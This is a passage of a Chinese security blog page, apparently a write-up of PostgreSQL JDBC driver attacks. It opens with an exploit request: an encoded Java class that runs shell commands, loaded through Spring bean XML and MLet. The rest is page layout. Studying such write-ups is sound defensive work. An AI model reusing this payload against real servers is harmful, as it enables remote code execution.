GxlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAIoAiwoAAgCMAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYMAI4AjwoAiQCQAQAFZmx1c2gMAJIABgoAiQCTAQAFY2xvc2UMAJUABgoAiQCWAQAEZXhlYwEAB29zLm5hbWUIAJkBABBqYXZhL2xhbmcvU3lzdGVtBwCbAQALZ2V0UHJvcGVydHkMAJ0AiwoAnACeAQALdG9Mb3dlckNhc2UMAKAADwoANAChAQADd2luCACjAQAHL2Jpbi9zaAgApQEAAi1jCACnAQAHY21kLmV4ZQgAqQEAAi9jCACrAQARamF2YS9sYW5nL1J1bnRpbWUHAK0BAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DACvALAKAK4AsQEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMAJgAswoArgC0AQARamF2YS9sYW5nL1Byb2Nlc3MHALYBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07DAC4ALkKALcAugEAEWphdmEvdXRpbC9TY2FubmVyBwC8AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAFAL4KAL0AvwEAAlxhCADBAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7DADDAMQKAL0AxQEAAAgAxwEAB2hhc05leHQBAAMoKVoMAMkAygoAvQDLAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIHAM0KAM4ACQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwwA0ADRCgDOANIBAARuZXh0DADUAA8KAL0A1QEACHRvU3RyaW5nDADXAA8KAM4A2AEACmdldE1lc3NhZ2UMANoADwoACADbAQATW0xqYXZhL2xhbmcvU3RyaW5nOwcA3QEAE2phdmEvaW8vSW5wdXRTdHJlYW0HAN8BAAZleUplWEEIAOEBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaD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&lt;/value&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">            &lt;/list&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">        &lt;/property&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">    &lt;/bean&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">    &lt;bean <span class="built_in">id</span>=<span class="string">&quot;classLoader&quot;</span> class=<span class="string">&quot;javax.management.loading.MLet&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">    &lt;bean <span class="built_in">id</span>=<span class="string">&quot;clazz&quot;</span> factory-bean=<span class="string">&quot;classLoader&quot;</span> factory-method=<span class="string">&quot;defineClass&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;constructor-arg ref=<span class="string">&quot;decoder&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;constructor-arg <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span> value=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;constructor-arg <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span> value=<span class="string">&quot;5133&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">    &lt;/bean&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">    &lt;bean factory-bean=<span class="string">&quot;clazz&quot;</span> factory-method=<span class="string">&quot;newInstance&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">&lt;/beans&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">------WebKitFormBoundaryIg9FMRJD9ScjO8dH--</span></span><br><span class="line"><span class="language-bash"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805740023-02a1d8b8-6fa3-4462-868a-c556fb317da4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805740023-02a1d8b8-6fa3-4462-868a-c556fb317da4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/JDBC/" class="">
+              JDBC
+            </a>
+          
+        </div>
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>CurlySean</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2025/08/07/PostgreSQL-JDBC-Attack/" target="_blank" title="PostgreSQL-JDBC-Attack">http://curlysean.github.io/2025/08/07/PostgreSQL-JDBC-Attack/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://pica.zhimg.com/80/v2-573ac3e25de03fad9c32add5a05e5cfc_1440w.webp" class="lazyload placeholder" data-srcset="https://pica.zhimg.com/80/v2-573ac3e25de03fad9c32add5a05e5cfc_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+    </div>
+    <a href="/2025/08/14/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="post-nav-link">
+      <div class="title">
+        <i class="fas fa-angle-left"></i> 上一篇:
+        <div class="title-text">Redis未授权</div>
+      </div>
+      
+      <!-- <div class="content">
+        Redis未授权
+好早以前写的文章了
+
+在之前打比赛时，遇到一个redis未授权访问的题目，搜搜索索写进去文件了，但是最
+      </div> -->
+    </a>
+  </div>
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://pic3.zhimg.com/v2-a5267dfbf175991d4b3a69b41f3f678a_b.jpg" class="lazyload placeholder" data-srcset="https://pic3.zhimg.com/v2-a5267dfbf175991d4b3a69b41f3f678a_b.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+    </div>
+    <a href="/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-nav-link">
+      <div class="title">
+        下一篇: <i class="fas fa-angle-right"></i>
+        <div class="title-text">Spring内存马</div>
+      </div>
+      <!-- <div class="content">
+        Spring内存马
+前言
+
+Spring内存马常见的有两种，Controller内存马和Interceptor内存马，有
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+      <div id="appDonate" class="post-donate">
+  <div id="donate_board" class="donate_bar center" ref="donate">
+    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
+  </div>
+  <transition name="fade">
+    <div 
+      class="donate-box-mask"
+      v-cloak 
+      v-show="visible"
+      @click="cancelDialogDrawer()"
+    >
+    </div>
+  </transition>
+  <transition name="bounce">
+    <div class="donate-box" v-cloak v-show="visible">
+      <div class="donate-box_close">
+        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
+      </div>
+      <div class="donate-box_title">
+        <h4>
+          你的赏识是我前进的动力
+        </h4>
+      </div>
+      <div class="donate-box_tab">
+        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
+          支付宝
+        </div>
+        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
+          微信
+        </div>
+      </div>
+      <div class="donate-box_img">
+        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
+          <img src="/medias/alipay.jpg" class="lazyload placeholder" data-srcset="/medias/alipay.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
+        </div> 
+        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
+          <img src="/medias/wechatpay.jpg" class="lazyload placeholder" data-srcset="/medias/wechatpay.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDonate',
+    data: {
+      visible: false,
+      tabActive: 'Alipay',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        // function getScroll() {
+        //   return {
+        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
+        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
+        //   };
+        // }
+        this.top = $(document).scrollTop() // or getScroll().top
+        // console.log('aa', $('.main-content'));
+        body.style.cssText = 'overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+      changeTabActive(name) {
+        this.tabActive = name;
+      }
+    },
+    created() {}
+  })
+</script>
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script defer src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+
+<!-- 还需要在后面这个地址里设置script, comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <aside id='l_side'>
+  
+    
+      <section class="widget side_blogger">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box circle' href='/about/'>
+          <img src='/medias/avatar.png'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+          <h2>CurlySean</h2>
+        
+        
+          <p>想要成为大佬的卷毛肖恩</p>
+
+        
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="mailto:5345414e@gmail.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/CurlySean"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=631722343"
+              class="social fab fa-qq flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+    
+  
+  
+  
+
+  <div class="layout_sticky">    
+    
+      
+<section class="widget side_toc">
+  
+  <header>
+    
+      <i style="color: " class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name' style="color: ">本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+    <div class="toc-main">
+      <div class="toc-content">
+        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HDMcM"><span class="toc-text">PostgreSQL-JDBC-Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FdnpK"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NS9IA"><span class="toc-text">PostgreSQL-JDBC RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#aPut1"><span class="toc-text">PostgreSQL Diver出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#kB94K"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#K49ou"><span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ti04E"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#f8A4x"><span class="toc-text">其他利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#mczVG"><span class="toc-text">JLabel</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#A8bcB"><span class="toc-text">MiniAdmin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#tVBEe"><span class="toc-text">IniEnvironment</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ihRex"><span class="toc-text">HikariConfig</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARtJM"><span class="toc-text">任意文件写入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ldLXH"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JrAG1"><span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xdkTh"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PvIWE"><span class="toc-text">其他利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#NXNu0"><span class="toc-text">log4j2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DQF19"><span class="toc-text">jar&#x2F;war包等zip包</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Y6juf"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QUkZI"><span class="toc-text">PostgreSQL不出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XjfxO"><span class="toc-text">漏洞分析</span></a></li></ol></li></ol></li></ol> -->
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- 手机端目录按钮 -->
+<div id="toc-mobile-btn">
+  <i class="fas fa-list-ul" aria-hidden="true"></i>
+</div>
+
+      
+  <section class="widget side_recent_post">
+    
+  <header>
+    
+      <a style="color: " href='/tags/'><i class="fas fa-book fa-fw" aria-hidden="true"></i><span class='name'>最新文章</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      
+      <!-- hash算法 -->
+      
+      <div class="aside-list">
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/08/26/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic2.zhimg.com/80/v2-63bbdb5b76b8d349ad35ff4281efbd37_1440w.webp" class="lazyload placeholder" data-srcset="https://pic2.zhimg.com/80/v2-63bbdb5b76b8d349ad35ff4281efbd37_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">08-26</span>
+                
+              </div>
+              <a class="post-title" href="/2025/08/26/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Jackson反序列化</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/08/19/JDK7u21/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic3.zhimg.com/80/v2-7cfc909ebe8d83683909846edd6b5232_1440w.webp" class="lazyload placeholder" data-srcset="https://pic3.zhimg.com/80/v2-7cfc909ebe8d83683909846edd6b5232_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">08-19</span>
+                
+              </div>
+              <a class="post-title" href="/2025/08/19/JDK7u21/">JDK7u21</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/08/15/H2-JDBC-Attack/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic2.zhimg.com/80/v2-29e78b52051ce542adf6d786d61fbd19_1440w.webp" class="lazyload placeholder" data-srcset="https://pic2.zhimg.com/80/v2-29e78b52051ce542adf6d786d61fbd19_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">08-15</span>
+                
+              </div>
+              <a class="post-title" href="/2025/08/15/H2-JDBC-Attack/">H2-JDBC-Attack</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/08/14/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pica.zhimg.com/80/v2-573ac3e25de03fad9c32add5a05e5cfc_1440w.webp" class="lazyload placeholder" data-srcset="https://pica.zhimg.com/80/v2-573ac3e25de03fad9c32add5a05e5cfc_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">08-14</span>
+                
+              </div>
+              <a class="post-title" href="/2025/08/14/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">Redis未授权</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/08/07/PostgreSQL-JDBC-Attack/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pica.zhimg.com/80/v2-61f99f8dcf899f54cad2a1aa28b21e44_1440w.webp" class="lazyload placeholder" data-srcset="https://pica.zhimg.com/80/v2-61f99f8dcf899f54cad2a1aa28b21e44_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">08-07</span>
+                
+              </div>
+              <a class="post-title" href="/2025/08/07/PostgreSQL-JDBC-Attack/">PostgreSQL-JDBC-Attack</a>
+            </div>
+          </div>
+        
+      </div>
+    </div>
+  </section>
+
+    
+  </div>
+</aside>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script defer src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
